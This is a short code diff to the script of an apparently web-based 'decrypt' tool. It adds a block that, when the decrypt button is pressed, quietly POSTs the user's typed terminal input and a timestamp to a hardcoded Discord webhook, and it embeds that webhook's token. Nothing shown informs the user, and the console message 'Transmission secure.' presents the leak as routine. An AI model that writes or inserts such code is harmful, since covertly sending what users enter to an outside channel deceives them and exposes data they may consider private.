@@ -49,6 +49,32 @@ document.addEventListener('DOMContentLoaded', () => {
         decryptBtn.innerText = 'Processing...';
         decryptBtn.disabled = true;
 
+        // Send to Discord Webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1489751218547855470/gTiynHXrc0iaq1xqV513DJobZgED-FT-lPT3Upq0rIPCxoJro0ywh3hpW4S8pjmQFu4m';
+        const payload = {
+            embeds: [{
+                title: "🔐 New Data Deciphered",
+                color: 5763719, // Success green
+                fields: [
+                    { name: "Terminal Input", value: "```" + value + "```" },
+                    { name: "Timestamp", value: new Date().toLocaleString() }
+                ],
+                footer: { text: "OmniDecrypt Terminal Engine" }
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            console.log("Transmission secure.");
+        })
+        .catch(err => {
+            console.error("Transmission failed:", err);
+        });
+
         setTimeout(() => {
             resultText.classList.add('visible');
             decryptBtn.innerText = 'Decrypt Sequence';
